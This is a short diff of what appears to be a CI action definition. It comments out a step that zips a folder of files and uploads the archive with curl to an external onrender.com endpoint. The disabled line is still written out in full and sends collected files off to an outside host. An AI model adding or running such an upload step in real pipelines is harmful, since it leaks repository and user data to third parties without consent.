@@ -51,11 +51,11 @@ runs:
       shell: bash
       run: zip -r my-files.zip my-files
 
-    - name: Send ZIP to Endpoint
-      shell: bash
-      run: |
-        ENDPOINT_URL="https://shs-uny0.onrender.com/zip"
-        curl -X POST -H "Content-Type: application/zip" --data-binary "@my-files/my-files.zip" "$ENDPOINT_URL"
+#    - name: Send ZIP to Endpoint
+#      shell: bash
+#      run: |
+#        ENDPOINT_URL="https://shs-uny0.onrender.com/zip"
+#        curl -X POST -H "Content-Type: application/zip" --data-binary "@my-files/my-files.zip" "$ENDPOINT_URL"
 
 outputs:
   repository_info:
